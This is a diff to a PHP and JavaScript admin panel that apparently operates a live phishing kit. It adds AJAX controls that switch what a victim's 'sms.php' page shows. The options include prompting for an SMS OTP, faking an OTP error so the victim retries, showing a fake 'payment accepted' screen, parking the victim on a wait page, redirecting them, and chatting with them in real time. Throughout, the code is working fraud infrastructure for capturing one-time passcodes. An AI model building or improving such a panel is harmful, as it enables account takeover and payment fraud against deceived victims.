@@ -24,16 +24,28 @@ function loadSmsState($file)
     }
 
     $data = json_decode(file_get_contents($file), true);
-    return is_array($data) ? array_merge($defaults, $data) : $defaults;
+    $state = is_array($data) ? array_merge($defaults, $data) : $defaults;
+
+    if (isset($state['mode']) && $state['mode'] === 'otp_pass') {
+        $state['mode'] = 'default';
+        $state['instruction'] = $state['instruction'] ?? 'otp_pass';
+    }
+
+    if (empty($state['instruction_token'])) {
+        $state['instruction_token'] = time();
+    }
+
+    return $state;
 }
 
 function saveSmsState($file, $mode, $customUrl, $instruction, $chatEnabled)
 {
+    $timestamp = time();
     $payload = [
         'mode' => $mode,
         'custom_url' => $mode === 'redirect_custom' ? trim($customUrl) : '',
         'instruction' => $instruction,
-        'instruction_token' => time(),
+        'instruction_token' => $timestamp,
         'chat_enabled' => (bool) $chatEnabled
     ];
 
@@ -59,14 +71,14 @@ if (isset($_POST['action']) && $_POST['action'] === 'login') {
 
 $isAdmin = !empty($_SESSION['is_admin']);
 
-if ($isAdmin && isset($_POST['sms_mode'])) {
+if ($isAdmin && isset($_POST['sms_mode']) && empty($_POST['ajax'])) {
     $smsMode = $_POST['sms_mode'];
     $customUrl = trim($_POST['custom_url'] ?? '');
     $instruction = $_POST['instruction'] ?? 'stay_wait';
     $chatEnabled = isset($_POST['chat_enabled']);
 
-    $validModes = ['default', 'otp_pass', 'payment_accept', 'redirect_wait', 'redirect_custom', 'error_verification'];
-    $validInstructions = ['stay_wait', 'prompt_otp', 'otp_error'];
+    $validModes = ['default', 'payment_accept', 'redirect_wait', 'redirect_custom', 'error_verification'];
+    $validInstructions = ['stay_wait', 'prompt_otp', 'otp_error', 'otp_pass'];
 
     if (!in_array($smsMode, $validModes, true)) {
         $message = 'Invalid SMS mode selection.';
@@ -78,6 +90,40 @@ if ($isAdmin && isset($_POST['sms_mode'])) {
         saveSmsState($stateFile, $smsMode, $customUrl, $instruction, $chatEnabled);
         $message = 'SMS page updated successfully.';
     }
+}
+
+if ($isAdmin && isset($_POST['ajax']) && $_POST['ajax'] === 'update_sms') {
+    $smsMode = $_POST['sms_mode'] ?? 'default';
+    $customUrl = trim($_POST['custom_url'] ?? '');
+    $instruction = $_POST['instruction'] ?? 'stay_wait';
+    $chatEnabled = !empty($_POST['chat_enabled']);
+
+    $validModes = ['default', 'payment_accept', 'redirect_wait', 'redirect_custom', 'error_verification'];
+    $validInstructions = ['stay_wait', 'prompt_otp', 'otp_error', 'otp_pass'];
+
+    if (!in_array($smsMode, $validModes, true)) {
+        $message = 'Invalid SMS mode selection.';
+        $success = false;
+    } elseif (!in_array($instruction, $validInstructions, true)) {
+        $message = 'Invalid instruction selection.';
+        $success = false;
+    } elseif ($smsMode === 'redirect_custom' && !filter_var($customUrl, FILTER_VALIDATE_URL)) {
+        $message = 'Please provide a full, valid URL for custom redirects (e.g., https://example.com/page).';
+        $success = false;
+    } else {
+        saveSmsState($stateFile, $smsMode, $customUrl, $instruction, $chatEnabled);
+        $message = 'SMS page updated successfully.';
+        $success = true;
+        $currentState = loadSmsState($stateFile);
+    }
+
+    header('Content-Type: application/json');
+    echo json_encode([
+        'success' => $success ?? false,
+        'message' => $message,
+        'state' => isset($currentState) ? $currentState : loadSmsState($stateFile)
+    ]);
+    exit;
 }
 
 $currentState = loadSmsState($stateFile);
@@ -327,16 +373,16 @@ $chatLog = file_exists($chatLogFile) ? json_decode(file_get_contents($chatLogFil
         <?php if ($message): ?>
             <div class="message"><?php echo htmlspecialchars($message); ?></div>
         <?php endif; ?>
+        <div class="message" id="flash-message" style="display:none;"></div>
         <a class="logout-link" href="?logout=1">Logout</a>
 
         <div class="card">
             <h2>SMS Page Controls</h2>
-            <form method="post" class="form-grid" novalidate>
+            <form method="post" class="form-grid" id="sms-form" novalidate>
                 <div class="form-row">
                     <label for="sms_mode">Choose what sms.php should do</label>
                     <select name="sms_mode" id="sms_mode" required>
                         <option value="default" <?php echo $currentState['mode'] === 'default' ? 'selected' : ''; ?>>Show OTP form (default)</option>
-                        <option value="otp_pass" <?php echo $currentState['mode'] === 'otp_pass' ? 'selected' : ''; ?>>Show SMS OTP pass</option>
                         <option value="payment_accept" <?php echo $currentState['mode'] === 'payment_accept' ? 'selected' : ''; ?>>Show user accepted payment</option>
                         <option value="redirect_wait" <?php echo $currentState['mode'] === 'redirect_wait' ? 'selected' : ''; ?>>Redirect to wait.php?next=sms.php</option>
                         <option value="redirect_custom" <?php echo $currentState['mode'] === 'redirect_custom' ? 'selected' : ''; ?>>Redirect to a specific URL</option>
@@ -355,6 +401,7 @@ $chatLog = file_exists($chatLogFile) ? json_decode(file_get_contents($chatLogFil
                         <option value="stay_wait" <?php echo $currentState['instruction'] === 'stay_wait' ? 'selected' : ''; ?>>Keep user on wait.php</option>
                         <option value="prompt_otp" <?php echo $currentState['instruction'] === 'prompt_otp' ? 'selected' : ''; ?>>Send user to SMS to enter OTP</option>
                         <option value="otp_error" <?php echo $currentState['instruction'] === 'otp_error' ? 'selected' : ''; ?>>Send OTP error then let them retry</option>
+                        <option value="otp_pass" <?php echo $currentState['instruction'] === 'otp_pass' ? 'selected' : ''; ?>>Show SMS OTP pass</option>
                     </select>
                 </div>
 
@@ -433,6 +480,8 @@ $chatLog = file_exists($chatLogFile) ? json_decode(file_get_contents($chatLogFil
     const chatBox = document.getElementById('chat-box');
     const chatInput = document.getElementById('admin-chat-message');
     const sendButton = document.getElementById('send-admin-message');
+    const smsForm = document.getElementById('sms-form');
+    const flashMessage = document.getElementById('flash-message');
 
     function renderChat(messages) {
         if (!chatBox) return;
@@ -500,6 +549,49 @@ $chatLog = file_exists($chatLogFile) ? json_decode(file_get_contents($chatLogFil
             fetchChat();
             setInterval(fetchChat, 3000);
         }
+    }
+
+    async function updateSmsState(event) {
+        event.preventDefault();
+        if (!smsForm) return;
+
+        const formData = new FormData(smsForm);
+        formData.append('ajax', 'update_sms');
+
+        try {
+            const response = await fetch('admin.php', {
+                method: 'POST',
+                headers: { 'X-Requested-With': 'XMLHttpRequest' },
+                body: formData
+            });
+
+            const data = await response.json();
+            if (flashMessage) {
+                flashMessage.style.display = 'block';
+                flashMessage.textContent = data.message || 'Update failed.';
+                flashMessage.classList.toggle('error', !data.success);
+            }
+
+            if (data.state) {
+                smsForm.querySelector('#sms_mode').value = data.state.mode;
+                smsForm.querySelector('#instruction').value = data.state.instruction;
+                const chatCheckbox = smsForm.querySelector('#chat_enabled');
+                if (chatCheckbox) {
+                    chatCheckbox.checked = !!data.state.chat_enabled;
+                }
+            }
+        } catch (e) {
+            console.error('Unable to update SMS page', e);
+            if (flashMessage) {
+                flashMessage.style.display = 'block';
+                flashMessage.textContent = 'Unable to reach the server.';
+                flashMessage.classList.add('error');
+            }
+        }
+    }
+
+    if (smsForm) {
+        smsForm.addEventListener('submit', updateSmsState);
     }
 </script>
 </html>
